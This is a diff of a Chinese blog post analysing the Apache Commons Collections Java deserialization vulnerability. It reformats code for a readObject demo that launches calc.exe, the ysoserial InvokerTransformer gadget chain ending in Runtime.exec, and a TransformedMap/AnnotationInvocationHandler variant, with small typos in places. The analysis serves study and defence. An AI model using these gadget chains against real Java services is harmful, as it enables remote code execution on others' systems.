@@ -1,7 +1,7 @@
 ---
 layout: post  
 title: "java反序列化漏洞-玄铁重剑之CommonsCollection(上)"  
-date: 2018-1-26  
+date: 2018-02-01  
 description: "java漏洞"  
 tag: 漏洞分析
 ---
@@ -68,61 +68,57 @@ win下
   ![](http://ohsqlm7gj.bkt.clouddn.com/18-2-1/73877567.jpg)
   即使最后是读者们执行readObject，最后也会一层一层到上帝来执行readObject，具体例子如下:
 	
-	public static class A implements Serializable {
-	private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
-	try {
-	System.out.printf("whoami");
-	new ProcessBuilder("calc.exe").start();
-	} catch (IOException e) {
-	e.printStackTrace();
-	}
-	}
-	}
-
-	package test;
+	public class A implements Serializable {
+    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
+        try {
+            System.out.printf("whoami");
+            new ProcessBuilder("calc.exe").start();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+    }
 	
-	import java.io.*;
-	
-	/**
-	* Created by xmm on 2017/12/26.
-	*/
 	public class Main {
-	public static class A implements Serializable {
-	private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
-	try {
-	System.out.printf("whoami");
-	//Runtime.getRuntime().exec(new String[]{"calc.exe"});
-	new ProcessBuilder("calc.exe").start();
-	} catch (IOException e) {
-	e.printStackTrace();
-	}
-	}
+    public static class A implements Serializable {
+        private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
+            try {
+                System.out.printf("whoami");
+                //Runtime.getRuntime().exec(new String[]{"calc.exe"});
+                new ProcessBuilder("calc.exe").start();
+            } catch (IOException e) {
+                e.printStackTrace();
+            }
+        }
+    }
+
+    public static void main(String[] args) {
+        try {
+            //写对象到文件中
+            writeObjectToFile();
+            //从文件中反序列化obj对象
+            FileInputStream fis = new FileInputStream("object.txt");
+            ObjectInputStream ois = new ObjectInputStream(fis);
+            ois.readObject();
+            ois.close();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+    }
+
+    public static void writeObjectToFile() throws FileNotFoundException, IOException {
+        A myObj = new A();
+        FileOutputStream fos = new FileOutputStream("object.txt");
+        ObjectOutputStream os = new ObjectOutputStream(fos);
+        os.writeObject(myObj);
+        os.close();
+
+    }
+
 	}
 	
-	public static void main(String[] args) {
-	try {
-	//写对象到文件中
-	writeObjectToFile();
-	//从文件中反序列化obj对象
-	FileInputStream fis = new FileInputStream("object.txt");
-	ObjectInputStream ois = new ObjectInputStream(fis);
-	ois.readObject();
-	ois.close();
-	} catch (Exception e) {
-	e.printStackTrace();
-	}
 	
-	}
-	
-	public static void writeObjectToFile() throws FileNotFoundException, IOException {
-	A myObj = new A();
-	FileOutputStream fos = new FileOutputStream("object.txt");
-	ObjectOutputStream os = new ObjectOutputStream(fos);
-	os.writeObject(myObj);
-	os.close();
-	
-	}
-	}
 	
  整个程序流程如下，先调用writeObjectToFile  函数将类A的对象序列化并保存到文件object.txt中，第二个流程是打开object.txt，并执行readObject函数，那么最终会执行到类A中定义的readObject函数，该函数中可以用做恶意操作，例如用来执行命令等，运行完这个流程后弹出了计算器。
      CVE-2015-8103刚出来的时候，boss直接被捅成了马蜂窝(威力可见一斑)。通过透漏的信息，我们得知 invoker/JMXInvokerServlet在这个请求中，找到jboss invoker/JMXInvokerServlet这个接口，我们可以查看其源码
@@ -135,9 +131,10 @@ win下
 InvocationHandler的使用例子例子如下:
 	
 	public interface Subject {
-	public void doSomething();
-	public void readObject();
-	}
+    public void doSomething();
+
+    public void readObject();
+}
 	
 	public class RealSubject implements Subject {
 	@Override
@@ -205,44 +202,66 @@ transform(object)中传入的object是一前一个transform(object)，最终构�
 	final Transformer[] transformers = new Transformer[]{
 	new ConstantTransformer(Runtime.class),
 	new InvokerTransformer("getMethod", new Class[]{
-	String.class, Class[].class}, new Object[]{
-	"getRuntime", new Class[0]}),
-	new InvokerTransformer("invoke", new Class[]{
-	Object.class, Object[].class}, new Object[]{
-	null, new Object[0]}),
-	new InvokerTransformer("exec",
-	new Class[]{String.class}, execArgs),
-	new ConstantTransformer(1)
-	};
-	
+	String.class, Class[].class
+	}
+	, new Object[]{
+		"getRuntime", new Class[0]
+	}
+	),
+		new InvokerTransformer("invoke", new Class[]{
+		Object.class, Object[].class
+	}
+	, new Object[]{
+		null, new Object[0]
+	}
+	),
+		new InvokerTransformer("exec",
+		new Class[]{
+		String.class
+	}
+	, execArgs),
+		new ConstantTransformer(1)
+	}
+	;	
 ysoserial中完整的poc如下:
 	
 	inal String[] execArgs = new String[] { command };
 	final Transformer transformerChain = new ChainedTransformer(
-	new Transformer[]{ new ConstantTransformer(1) });
+		new Transformer[]{ new ConstantTransformer(1)
+	}
+	);
 	final Transformer[] transformers = new Transformer[] {
-	new ConstantTransformer(Runtime.class),
-	new InvokerTransformer("getMethod", new Class[] {
-	String.class, Class[].class }, new Object[] {
-	"getRuntime", new Class[0] }),
-	new InvokerTransformer("invoke", new Class[] {
-	Object.class, Object[].class }, new Object[] {
-	null, new Object[0] }),
-	new InvokerTransformer("exec",
-	new Class[] { String.class }, execArgs),
-	new ConstantTransformer(1) };
-
+		new ConstantTransformer(Runtime.class),
+		new InvokerTransformer("getMethod", new Class[] {
+	String.class, Class[].class
+	}
+	, new Object[] {
+	"getRuntime", new Class[0]
+	}
+	),
+		new InvokerTransformer("invoke", new Class[] {
+	Object.class, Object[].class
+	}
+	, new Object[] {
+	null, new Object[0]
+	}
+	),
+		new InvokerTransformer("exec",
+		new Class[] {
+	String.class
+	}
+	, execArgs),
+		new ConstantTransformer(1)
+	}
+	;
 	final Map innerMap = new HashMap();
-	
 	final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-	
 	final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
-	
 	final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
-	
-	Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
-
+	Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
+	// arm with actual transformer chain
 	return handler;
+	
 	
 其实通过分析可以找到很多调用链的，比如
 InvokerTransformer.transform()->TransformedMap.checkSetValue()->AbstractInputCheckedMapDecorator.setValue()->TreeMap.put()->CoreDocumentImpl.readObject()
@@ -264,14 +283,15 @@ InvokerTransformer.transform()->TransformedMap.checkSetValue()->AbstractInputChe
 	for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
 	String name = memberValue.getKey();
 	Class<?> memberType = memberTypes.get(name);
-	if (memberType != null) { // i.e. member still exists
-	Object value = memberValue.getValue();
-	if (!(memberType.isInstance(value) ||
-	value instanceof ExceptionProxy)) {
-	memberValue.setValue(
-	new AnnotationTypeMismatchExceptionProxy(
-	value.getClass() + "[" + value + "]").setMember(
-	annotationType.members().get(name)));
+	if (memberType != null) {
+		// i.e. member still exists
+		Object value = memberValue.getValue();
+		if (!(memberType.isInstance(value) ||
+			value instanceof ExceptionProxy)) {
+			memberValue.setValue(
+				new AnnotationTypeMismatchExceptionProxy(
+				value.getClass() + "[" + value + "]").setMember(
+				annotationType.members().get(name)));
 
 要其执行要满足两个条件,memberValues不能为空，并且memberType不能为空
 String name = memberValue.getKey();
@@ -285,59 +305,71 @@ memberTypes是Retention，查找下注释Retention中的成员，发现有一个
 	// inert chain for setup
 	// real chain for after setup
 	final Transformer[] transformers = new Transformer[]{
-	new ConstantTransformer(Runtime.class),
-	new InvokerTransformer("getMethod", new Class[]{
-	String.class, Class[].class}, new Object[]{
-	"getRuntime", new Class[0]}),
-	new InvokerTransformer("invoke", new Class[]{
-	Object.class, Object[].class}, new Object[]{
-	null, new Object[0]}),
-	new InvokerTransformer("exec",
-	new Class[]{String.class}, execArgs),
-	new ConstantTransformer(1)};
+		new ConstantTransformer(Runtime.class),
+		new InvokerTransformer("getMethod", new Class[]{
+		String.class, Class[].class
+	}
+	, new Object[]{
+		"getRuntime", new Class[0]
+	}
+	),
+		new InvokerTransformer("invoke", new Class[]{
+		Object.class, Object[].class
+	}
+	, new Object[]{
+		null, new Object[0]
+	}
+	),
+		new InvokerTransformer("exec",
+		new Class[]{
+		String.class
+	}
+	, execArgs),
+		new ConstantTransformer(1)
+	}
+	;
 	final Transformer transformerChain = new ChainedTransformer(
-	new Transformer[]{new ConstantTransformer(1)});
+		new Transformer[]{new ConstantTransformer(1)
+	}
+	);
 	//Transformer transformerChain = new ChainedTransformer(transformers);
 	Map map = new HashMap();
 	Map transformedmap = TransformedMap.decorate(map, null, transformerChain);
 	transformedmap.put("value", "xx");
 	Class cls = Class
-	.forName("sun.reflect.annotation.AnnotationInvocationHandler");
+		.forName("sun.reflect.annotation.AnnotationInvocationHandler");
 	InvocationHandler handler = (InvocationHandler) getFirstCtor("sun.reflect.annotation.AnnotationInvocationHandler").newInstance(Retention.class, transformedmap);
 	Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 	return handler;
 	}
-	
 	public static void main(final String[] args) throws Exception {
 	PayloadRunner.run(CommonsCollections7.class, args);
 	}
-	
-	public static boolean isApplicableJavaVersion() {
+	public static Boolean isApplicableJavaVersion() {
 	return JavaVersion.isAnnInvHUniversalMethodImpl();
 	}
-	
 	public static Constructor getFirstCtor(final String name)
-	throws Exception {
+		throws Exception {
 	final Constructor<?> ctor = Class.forName(name)
-	.getDeclaredConstructors()[0];
+		.getDeclaredConstructors()[0];
 	ctor.setAccessible(true);
 	return ctor;
 	}
-	
 	public static Field getField(Class<?> clazz, String fieldName) throws NoSuchFieldException {
 	Field field = clazz.getDeclaredField(fieldName);
 	if (field != null)
-	field.setAccessible(true);
-	else if (clazz.getSuperclass() != null)
-	field = getField(clazz.getSuperclass(), fieldName);
+		field.setAccessible(true); else if (clazz.getSuperclass() != null)
+		field = getField(clazz.getSuperclass(), fieldName);
 	field.setAccessible(true);
 	return field;
 	}
-	
 	public static void setField(Object object, String fieldName, Object value) throws NoSuchFieldException, IllegalAccessException {
 	Field field = getField(object.getClass(), fieldName);
 	field.set(fieldName, value);
 	}
 	
 ![](http://ohsqlm7gj.bkt.clouddn.com/18-2-1/29737134.jpg)
-		
+
+## 参考链接 
+[https://github.com/frohoff/ysoserial]()
+[https://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/]()
